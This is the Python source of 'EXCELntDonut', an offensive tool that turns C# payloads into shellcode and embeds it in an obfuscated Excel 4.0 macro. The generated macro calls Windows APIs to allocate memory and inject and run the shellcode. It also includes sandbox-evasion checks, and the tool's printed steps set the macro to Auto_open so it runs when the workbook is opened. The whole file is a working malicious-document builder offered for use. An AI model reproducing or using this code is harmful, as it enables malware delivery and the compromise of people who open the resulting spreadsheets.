#!/usr/bin/python3

import os, subprocess, random, string, sys
import donut
import argparse
from shutil import which
import pandas as pd
from io import StringIO


'''
Usage: 
	python3 excelntdonut.py -f source.cs --obfuscate --sandbox

Options:
	-f source.cs           C# source code (your payload must execute within the main() function)
	-c classname		   (required for DLL. This is the classname for the method you want to run)
	-m methodname          (required for DLL. This is the method you want to call)
	-r 'System.Management' References needed to compile your C# code (same ones for when using mcs to compile on Linux)
	-o 'output.txt'        Output filename. Defaults to excelentdonut.txt
	--obfuscate            Run obfuscation framework
	--sandbox              Perform sandbox checks

Requirements:
	Donut (pip3 install donut-shellcode)
	MSFVenom (default installed on Kali Linux)
	MCS - Mono C# compiler (apt-get install mono-complete)

Input File:
	CS source code with a method containing your payload. Recommend using parent PID spoofing.

Note:
	- Doesn't work against  < .NET v4.0.30319. It definitely could, but it's not configured for that yet.

'''

def main():

	#Check runtime env for requirements
	runtimeCheck()

	#Argument parsing.
	parser = argparse.ArgumentParser()
	parser.add_argument("-f", dest="inputFileName", help="Path to C# source code for a .NET DLL or EXE", \
	 required=True)
	parser.add_argument("-c", dest="className", help="(Required for DLLs) name of class where \
		payload method lives.", required=False, default="")
	parser.add_argument("-m", dest="methodName", help="(Required for DLLs) name of method \
		which executes your  payload", required=False, default="")
	parser.add_argument("-r", dest="references", type=str, help="References needed for compiling \
		your C# source code. These would be the same as if you were compiling it using \
		MCS on linux. Ex: 'System.Management,....,...'", required=False, )
	parser.add_argument("-o", dest="outputFile", type=str, \
		help="Output filename. Defaults to excelntdonut.txt", default="excelntdonut.txt", required=False)
	parser.add_argument("--sandbox", dest="sandboxChecks", action="store_true", \
		help="Perform sandbox checks.", default=False, required=False)
	parser.add_argument("--obfuscate", dest="obfuscation", action="store_true", \
		help="Perform obfuscation.", default=False, required=False)
	args = parser.parse_args()
	
	#Check if source code file exists
	if not os.path.exists(args.inputFileName):
		print("[!] Could not open or read file [{}]".format(args.inputFileName))
		sys.exit()

	#Check for both class and method or neither
	if args.className:
		if not args.methodName:
			print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
			sys.exit()
	else:
		if args.methodName:
			print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
			sys.exit()

	#Generate shellcode in x86 and x64 archs 
	x86Shellcode, x86Size, x86Count = generateShellcode(args,'x86')
	x64Shellcode, x64Size, x64Count = generateShellcode(args,'x64')

	frames = []
	if not args.obfuscation:
		#Generate unobfuscated macro code
		columnA = generateClearInstructions(args, x86Size, x64Size, x86Count, x64Count)
		#Create blank dataframe to balance dfD in obfuscated flag
		dfD = pd.DataFrame()
	else:
		#Random offset, so code isn't immediately visible on sheet open
		offset = random.randint(99,149)
		#Generate obfuscated macro
		columnA, dfD = generateObfuscatedInstructions(args, x86Size, x64Size, offset, x86Count, x64Count)
		#Create empty dataframes for offset
		for i in range(1,offset):
			frames.append(pd.DataFrame(columns=[i]))

	#Prep col A for pandas dataframe
	columnA = StringIO(columnA)
	dfA = pd.read_csv(columnA,sep="\r\n",header=None, engine="python")

	#Prep shellcode strings for pandas dataframe
	columnB = StringIO(x86Shellcode)
	dfB = pd.read_csv(columnB,sep="\r\n",header=None, engine="python")
	columnC = StringIO(x64Shellcode)
	dfC = pd.read_csv(columnC,sep="\r\n",header=None, engine="python")

	#Add columns as dataframes to frames var, then concatenate them 
	frames.extend([dfA,dfB,dfC,dfD])
	
	#Concatenate dataframes, set NaN values to ""
	df = pd.concat(frames, axis=1, ignore_index=True)
	df.fillna(value="")
	
	#Write dataframe to file
	df.to_csv(args.outputFile,header=False, index=False, sep=";")

	#Print instructions
	finalize()
	
def chunks(s, n):
	"""
	Author: HarmJ0y, borrowed from Empire
	Generator to split a string s into chunks of size n.

	Updated to Python3 (aka changed xrange to range)
	"""
	for i in range(0, len(s), n):
		yield s[i:i+n]

def runtimeCheck():
	#Check if running on Linux/OSX
	if os.name != 'posix':
		print("[!] Must be run on Linux. (Kali recommended)")
		sys.exit()

	#Check if msfvenom installed
	if which("msfvenom") is None:
		print("[!] Must have msfvenom installed and accessible in current path.")
		print("[!] Running this on Kali is the easiest option.")
		print("[i] To install msfvenom:")
		print("[i] \thttps://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework")
		sys.exit()

	#Check if mcs is installed
	if which("mcs") is None:
		print("[!] Must have mcs installed and accessible in current path.")
		print("[i] To install:")
		print("[i] \tapt-get install mono-complete")
		sys.exit()

	#Obligatory ASCII art
	print(" _______  ______ _____ _           _   ____                    _   ")
	print("| ____\ \/ / ___| ____| |    _ __ | |_|  _ \  ___  _ __  _   _| |_ ")
	print("|  _|  \  / |   |  _| | |   | '_ \| __| | | |/ _ \| '_ \| | | | __|")
	print("| |___ /  \ |___| |___| |___| | | | |_| |_| | (_) | | | | |_| | |_ ")
	print("|_____/_/\_\____|_____|_____|_| |_|\__|____/ \___/|_| |_|\__,_|\__|")
	print("                    by @JoeLeonJr (@FortyNorthSec)                ")


def generateShellcode(args, arch):

	#In Donut x86=1 and amd64=2, not using x64+x86 since
	#sometimes compiling for "Any Computer" does weird things.
	if arch == "x86":
		donutArch = 1
	else:
		donutArch = 2

	#If user provided source code is a DLL, make sure update
	# the target param for MCS compilation
	if args.methodName:
		target = "library"
	else:
		target = "exe"

	#Generate random string for temp file storage
	randStr = ''.join(random.choice(string.ascii_letters) for x in range(random.randrange(6, 12)))
	randExeName = "_excelntdonut_" + randStr + ".exe"
	randBinName = "_excelntdonut_" + randStr + ".bin"
	randBinName2 = "_excelntdonut_" + randStr + "2.bin"

	#Using MCS to compile into .NET assembly
	print("[i] Generating your " + arch + " .NET assembly.")
	cmd = "mcs /unsafe /target:" + target + " /platform:" + arch + " /sdk:4 /out:" + randExeName 
	if args.references:
		cmd += " /reference:" + args.references
	cmd += " " + args.inputFileName
	pipe = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	stdout, stderr = pipe.communicate()
	if stderr:
		if "error" in stderr.decode('utf-8'):
			print(stderr.decode('utf-8'))
			print("[x] Error in generating " + arch + " .NET assembly using MCS. See error message above.")
			sys.exit()

	#Using donut to transform into bin file (shellcode)
	#Note: not using Donut's AMSI bypass since XLM doesn't require it + in case it's signatured
	print("[i] Generating shellcode from " + arch + " .NET assembly file.")
	s = donut.create(file=randExeName, arch=donutArch, bypass=1, cls=args.className, method=args.methodName)
	os.system("rm " + randExeName)
	with open(randBinName,'wb+') as f:
		f.write(s)

	#Using msfvenom to remove nullbytes from shellcode (XLM won't support nullbytes)
	#This might take a while to run. 
	#Consider updating to just arch/xor_dynamic encoder since seems to work best
	print("[i] Removing null bytes from " + arch + " shellcode with msfvenom")
	cmd = "cat " + randBinName + " | msfvenom -p - -a " + arch + " --platform windows -b '\\x00' -f raw -o " + randBinName2 
	os.system(cmd)
	pipe = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	stdout, stderr = pipe.communicate()

	#Make sure virtualloc enough space. Default to 65536.
	#Suppose we could make the size dynamic.
	try:
		payloadSize = int(stderr.split(b"Payload size: ")[1].split(b" bytes")[0].decode('utf-8'))
		size = 65536
		while payloadSize > size:
			size *= 2
	except:
		print("[x] Error removing null bytes.")
		print(stderr)
		sys.exit()
	os.system("rm " + randBinName)


	#Read in shellcocde file (no null bytes) and create string
	print("[i] Null bytes removed for " + arch + ".")
	with open(randBinName2,'rb') as f:
		binary = f.read().decode('ISO-8859-1')
	os.system("rm " + randBinName2)

	#Create EXCEL string with CHAR() for shellcode
	#Max 255 per cell, so chunk, then process into =CHAR(2)&CHAR(234) format
	#https://gist.githubusercontent.com/Arno0x/1ec189d6bee3e92fdef1d72a72899b1d/raw/b97a190d4b88c502347d074b08d624a76621b314/transformFile.py
	column = ''
	count = 1
	if arch == "x86":
		chunkSize = 255
	else:
		chunkSize = 10
	for chunk in chunks(binary, chunkSize):
		column += '='
		for b in chunk:
			column += 'CHAR({})&'.format(ord(b))
		column = column[0:-1] + '\r\n'
		count += 1
	column += 'excel\r\n'
	count += 1
	count = str(count)

	return column, size, count

def getColumnLetters(colNumber):
	#Function modified from (https://www.geeksforgeeks.org/find-excel-column-name-given-number/)

	colNumber = int(colNumber)
	
	colLetter = ""

	while colNumber > 0: 
		# Find remainder 
		rem = colNumber % 26
		# if remainder is 0, then a  
		# 'Z' must be there in output 
		if rem == 0: 
			colLetter += 'Z'
			colNumber = (colNumber // 26) - 1
		else: 
			colLetter += chr((rem - 1) + ord('A')) 
			colNumber = colNumber // 26
	# Reverse the string and print result 
	return colLetter[::-1]

def generateRandomCols(offset):
	'''
	A few things going on here:
	1. This is only used for Obfuscated Code
	2. Creating a R1C1 and A1 format for columns
	3. Creating 5 types of columns:
		- main column houses obfuscated code (ex: =FORMULA())
		- action column is where deobfuscated code lands
		- x86 is for x86 shellcode (in =CHAR()&CHAR() format)
		- x64 same as above but for x64 shellcode
		- tracking column houses two bits of data to track while
		iterating through the shellcode during writeprocessmemory

	'''

	cols = {}
	cols['mainColR1'] = str(offset)
	cols['actionColR1'] = str(offset + 5)
	cols['x86ColR1'] = str(offset+1)
	cols['x64ColR1'] = str(offset+2)
	cols['charColR1'] = str(offset+3)
	cols['trackingColR1'] = str(offset+4)
	cols['mainColA1'] = getColumnLetters(cols['mainColR1'])
	cols['actionColA1'] = getColumnLetters(cols['actionColR1'])
	cols['x86ColA1'] = getColumnLetters(cols['x86ColR1'])
	cols['x64ColA1'] = getColumnLetters(cols['x64ColR1'])
	cols['charColA1'] = getColumnLetters(cols['charColR1'])
	cols['trackingColA1'] = getColumnLetters(cols['trackingColR1'])
	return cols

def generateClearInstructions(args, x86Size, x64Size, x86Count, x64Count):
	
	#Refer to function above to get a sense for what these cols mean
	mainCol = "A"
	x86Col = "B"
	x64Col = "C"
	trackingCol = "D"
	
	##Header
	columnAList = []

	#Sandbox Check
	if args.sandboxChecks:
		#Is there a mouse present?
		columnAList.append('=IF(GET.WORKSPACE(19),,CLOSE(TRUE))\r\n')
		#Can the host play sounds?
		columnAList.append('=IF(GET.WORKSPACE(42),,CLOSE(TRUE))\r\n')
		#What is the width?
		columnAList.append('=IF(GET.WORKSPACE(13)<770,CLOSE(TRUE),)\r\n')
		#What is the height?
		columnAList.append('=IF(GET.WORKSPACE(14)<381,CLOSE(TRUE),)\r\n')
		#Is this a windows environment?
		columnAList.append('=IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))),,CLOSE(TRUE))\r\n')
	else:
		columnAList.append('=GOTO(' + mainCol + '2)\r\n')
		columnAList.append('=GOTO(' + mainCol + '3)\r\n')
		columnAList.append('=GOTO(' + mainCol + '4)\r\n')
		columnAList.append('=GOTO(' + mainCol + '5)\r\n')
		columnAList.append('=GOTO(' + mainCol + '6)\r\n')

		
	#A1 Style
	columnAList.append('=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)\r\n')
	columnAList.append('=REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)\r\n')
	columnAList.append('=REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)\r\n')
	columnAList.append('=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(' + mainCol + '10),GOTO(' + mainCol + '21))\r\n')
	
	#32-bit valloc + shellcode selection
	#VirtualAlloc>WriteProcessMemory>RtlCopyMemory
	columnAList.append('=Valloc(0,' + str(x86Size) + ',4096,64)\r\n')
	columnAList.append('main=$' + x86Col + '$1\r\n')
	columnAList.append('=SET.VALUE(' + trackingCol + '1,0)\r\n')
	columnAList.append('=WHILE(main<>"excel")\r\n')
	columnAList.append('=SET.VALUE(' + trackingCol + '2,LEN(main))\r\n')
	columnAList.append('=WProcessMemory(-1,' + mainCol + '10+(' + trackingCol + '1*255),main,LEN(main),0)\r\n')
	columnAList.append('=SET.VALUE(' + trackingCol + '1,' + trackingCol + '1+1)\r\n')
	columnAList.append('main=ABSREF("R[1]C",main)\r\n')
	columnAList.append('=NEXT()\r\n')
	columnAList.append('=CThread(0,0,' + mainCol + '10,0,0,0)\r\n')
	columnAList.append('=HALT()\r\n')
	
	#64-bit valloc + shellcode selection
	#VirtualAlloc>RtlCopyMemory>QueueUserAPC>NtTestAlert
	#Cycling through addresses to hack the 4-byte vs. 8-byte int issue with 32 vs. 64-bit arch
	#increasing by 262144 each time to improve chances of finding a good spot
	columnAList.append('1342177280\r\n')
	columnAList.append('0\r\n')
	columnAList.append('=WHILE(' + mainCol + '22=0)\r\n')
	columnAList.append('=SET.VALUE(' + mainCol + '22,Valloc(' + mainCol + '21,' + str(x64Size) + ',12288,64))\r\n')
	columnAList.append('=SET.VALUE(' + mainCol + '21,' + mainCol + '21+262144)\r\n')
	columnAList.append('=NEXT()\r\n')
	columnAList.append('=REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)\r\n')
	columnAList.append('=REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)\r\n')
	columnAList.append('=REGISTER("ntdll","NtTestAlert","J","Go",,1,9)\r\n')
	columnAList.append('main=$' + x64Col + '$1\r\n')
	columnAList.append('=SET.VALUE(' + trackingCol + '1,0)\r\n')
	columnAList.append('=WHILE(main<>"EXCEL")\r\n')
	columnAList.append('=SET.VALUE(' + trackingCol + '2,LEN(main))\r\n')
	columnAList.append('=RTL(' + mainCol + '22+(' + trackingCol + '1*10),main,LEN(main))\r\n')
	columnAList.append('=SET.VALUE(' + trackingCol + '1,' + trackingCol + '1+1)\r\n')
	columnAList.append('main=ABSREF("R[1]C",main)\r\n')
	columnAList.append('=NEXT()\r\n')
	columnAList.append('=Queue(' + mainCol + '22,-2,0)\r\n')
	columnAList.append('=Go()\r\n')
	columnAList.append('=SET.VALUE(A22,0)\r\n')
	columnAList.append('=HALT()\r\n')

	columnA = ""
	for sentence in columnAList:
		columnA += sentence

	return columnA

def generateObfuscatedInstructions(args,x86Size, x64Size, offset, x86Count, x64Count):
	
	#Generate random column offset
	cols = generateRandomCols(offset)
	
	##Header
	columnAList = []

	#Sandbox Check
	if args.sandboxChecks:
		#Is there a mouse present?
		columnAList.append('=IF(GET.WORKSPACE(19),,CLOSE(TRUE))\r\n')
		#Can the host play sounds?
		columnAList.append('=IF(GET.WORKSPACE(42),,CLOSE(TRUE))\r\n')
		#What is the width?
		columnAList.append('=IF(GET.WORKSPACE(13)<770,CLOSE(TRUE),)\r\n')
		#What is the height?
		columnAList.append('=IF(GET.WORKSPACE(14)<381,CLOSE(TRUE),)\r\n')
		#Is this a windows environment?
		columnAList.append('=IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))),,CLOSE(TRUE))\r\n')
	else:
		columnAList.append('=GOTO(R2C' + cols['actionColR1'] + ')\r\n')
		columnAList.append('=GOTO(R3C' + cols['actionColR1'] + ')\r\n')
		columnAList.append('=GOTO(R4C' + cols['actionColR1'] + ')\r\n')
		columnAList.append('=GOTO(R5C' + cols['actionColR1'] + ')\r\n')
		columnAList.append('=GOTO(R6C' + cols['actionColR1'] + ')\r\n')

		
	#R1C1 Style (required for obfuscated =FORMULA() function)
	columnAList.append('=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)\r\n')
	columnAList.append('=REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)\r\n')
	columnAList.append('=REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)\r\n')
	columnAList.append('=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R10C' + cols['actionColR1'] + '),GOTO(R21C' + cols['actionColR1'] + '))\r\n')
	
	#32-bit valloc + shellcode selection
	columnAList.append('=Valloc(0,' + str(x86Size) + ',4096,64)\r\n')
	columnAList.append('main=R1C' + cols['x86ColR1'] + '\r\n')
	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',0)\r\n')
	columnAList.append('=WHILE(main<>"excel")\r\n')
	columnAList.append('=SET.VALUE(R2C' + cols['trackingColR1'] + ',LEN(main))\r\n')
	columnAList.append('=WProcessMemory(-1,R10C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*255),main,LEN(main),0)\r\n')
	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',R1C' + cols['trackingColR1'] + '+1)\r\n')
	columnAList.append('main=ABSREF("R[1]C",main)\r\n')
	columnAList.append('=NEXT()\r\n')
	columnAList.append('=CThread(0,0,R10C' + cols['actionColR1'] + ',0,0,0)\r\n')
	columnAList.append('=HALT()\r\n')
	
	#64-bit valloc + shellcode selection
	columnAList.append('1342177280\r\n')
	columnAList.append('0\r\n')
	columnAList.append('=WHILE(R22C' + cols['actionColR1'] + '=0)\r\n')
	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ',Valloc(R21C' + cols['actionColR1'] + ',' + str(x64Size) + ',12288,64))\r\n')
	columnAList.append('=SET.VALUE(R21C' + cols['actionColR1'] + ',R21C' + cols['actionColR1'] + '+262144)\r\n')
	columnAList.append('=NEXT()\r\n')
	columnAList.append('=REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)\r\n')
	columnAList.append('=REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)\r\n')
	columnAList.append('=REGISTER("ntdll","NtTestAlert","J","Go",,1,9)\r\n')
	columnAList.append('main=R1C' + cols['x64ColR1'] + '\r\n')
	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',0)\r\n')
	columnAList.append('=WHILE(main<>"EXCEL")\r\n')
	columnAList.append('=SET.VALUE(R2C' + cols['trackingColR1'] + ',LEN(main))\r\n')
	columnAList.append('=RTL(R22C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*10),main,LEN(main))\r\n')
	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',R1C' + cols['trackingColR1'] + '+1)\r\n')
	columnAList.append('main=ABSREF("R[1]C",main)\r\n')
	columnAList.append('=NEXT()\r\n')
	columnAList.append('=Queue(R22C' + cols['actionColR1'] + ',-2,0)\r\n')
	columnAList.append('=Go()\r\n')
	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ',0)\r\n')
	columnAList.append('=HALT()\r\n')
	
	#Obfuscate commands
	#General idea: Create a column with all the letters and symbols we see in col A.
	#Then iterate through the entire columnA string and change it to this format:
	# =FORMULA(A4&B56&G2....) using the letters and symbols
	#Could easily change to CHAR(#) instead of the letters and symbols.
	if args.obfuscation:
		columnD = ''
		letterTranslation = {}
		specialChars = ["[","]","=","(",")","\"","<",">",".","+","*",":","-",","]
		rowCount = 1
		for i in string.ascii_letters:
			columnD += i + "\r\n"
			letterTranslation[i] = cols['charColA1'] + str(rowCount)
			rowCount += 1
		for i in string.digits:
			columnD += i + "\r\n"
			letterTranslation[i] = cols['charColA1'] + str(rowCount)
			rowCount += 1
		for i in specialChars:
			columnD += i + "\r\n"
			letterTranslation[i] = cols['charColA1'] + str(rowCount)
			rowCount += 1

		#columnD contains the alphanumeric table
		columnD = StringIO(columnD)
		dfD = pd.read_csv(columnD,sep="\r\n",header=None, engine="python")

		#Replace chars in main column (instructions column) with references
		# to the alphanumeric table we created above. It's not really a table
		# but a column with the A-Z etc filled in and we can reference those values.
		obfColumnA = []
		row = 1
		for sentence in columnAList:
			newSentence = "=FORMULA("
			for i in sentence:
				if i == "\r":
					newSentence = newSentence[:-1]
					newSentence += "," + cols['actionColA1'] + str(row) 
					newSentence += ")\r\n"
					continue
				if i == "\n":
					break
				newSentence += letterTranslation[i]
				newSentence += "&"
			obfColumnA.append(newSentence)
			row += 1
		columnAList = obfColumnA
		columnAList.append("=GOTO(" + cols['actionColA1'] + "1)\r\n")

	columnA = ""
	for sentence in columnAList:
		columnA += sentence

	return columnA, dfD


def finalize():
	print("[i] Successfully turned your C# file into an XLM macro.")
	print('')
	print("################################################")
	print("#                 NEXT STEPS                   #")
	print("################################################")
	print("# 1. Open an Excel workbook.                   #")
	print("# 2. Right click to insert a new sheet.        #")
	print("#    Select 'MS Excel 4.0 Macro'.              #")
	print("# 3. Open your output file in a text editor,   #")
	print("#     copy everything and paste it into Excel. #") 
	print("# 4. Columns are divided by semi-colons (;)    #")
	print("#     use the Text-to-columns feature in Excel #")
	print("#     to separate the data into columns.       #")                    
	print("# 5. Right click on the first cell of your     #")
	print("#    macro (A1 unless using obfuscation).      #") 
	print("#    Click 'Run' to make sure the code works.  #")
	print("# 6. Left click on that same cell. Then,       #")
	print("#    click the drop down right above it that   #")
	print("#    says A1 (or whatever the first cell is)   #")
	print("#    and change it to 'Auto_open'              #")
	print("# 7. Save the file as .xls or .xlsm            #")
	print("################################################")
	print("#       By @JoeLeonJr (@FortyNorthSec)         #")
	print("################################################")


if __name__ == "__main__":
	main()